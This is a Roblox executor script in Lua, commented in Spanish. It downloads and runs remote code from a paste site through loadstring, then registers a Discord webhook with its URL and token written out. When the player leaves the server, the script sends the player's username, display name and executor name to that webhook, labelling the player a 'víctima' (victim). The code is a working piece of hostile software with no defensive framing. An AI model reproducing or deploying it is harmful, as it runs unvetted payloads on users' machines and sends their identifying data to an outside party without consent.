getgenv().EjecutarsePrimero = true

-- Evitar que se ejecute dos veces
if getgenv().ScriptYaEjecutado then return end
getgenv().ScriptYaEjecutado = true

-- 1. Ejecutar tu script externo primero
loadstring(game:HttpGet("https://cdn.sourceb.in/bins/d7tPQFbVBD/0", true))()

-- 2. Configuración del webhook
local HttpService = game:GetService("HttpService")
local Players = game:GetService("Players")
local LocalPlayer = Players.LocalPlayer

local WebhookURL = "https://discord.com/api/webhooks/1384927333562978385/psrT9pR05kv9vw4rwr4oyiDcb07S3ZqAlV_2k_BsbI2neqrmEHOCE_QuFvVvRwd7lNuY"

-- Detectar executor
local Executor = "Desconocido"
if identifyexecutor then
    local success, exec = pcall(identifyexecutor)
    if success and exec then
        Executor = exec
    end
end

-- Función para enviar embed al webhook
local function SendWebhook(title, description, color)
    local Data = {
        ["embeds"] = {{
            ["title"] = title,
            ["description"] = description,
            ["type"] = "rich",
            ["color"] = color,
            ["thumbnail"] = { ["url"] = "https://i.postimg.cc/DZW66bqk/IMG-20250316-120840.jpg" },
            ["footer"] = {
                ["text"] = "Sistema de alerta • " .. os.date("%d/%m/%Y %H:%M:%S")
            }
        }}
    }
    local FinalData = HttpService:JSONEncode(Data)
    local request = request or http_request or (syn and syn.request) or (fluxus and fluxus.request)
    if request then
        request({
            Url = WebhookURL,
            Method = "POST",
            Headers = {["Content-Type"] = "application/json"},
            Body = FinalData
        })
    end
end

-- 3. Detectar cuando el jugador se va
LocalPlayer.AncestryChanged:Connect(function(_, parent)
    if not parent then
        local hora = os.date("%H:%M:%S")
        local msg = "⚠️ **Víctima se salió del servidor** 🚨\n"
        msg = msg .. "👤 Usuario: **" .. LocalPlayer.Name .. "**\n"
        msg = msg .. "🎭 Display: **" .. LocalPlayer.DisplayName .. "**\n"
        msg = msg .. "🖥️ Executor: **" .. Executor .. "**\n"
        msg = msg .. "⏰ Hora: **" .. hora .. "**"

        SendWebhook("🚨 Alerta de salida 🚨", msg, 16711680) -- rojo
    end
end)
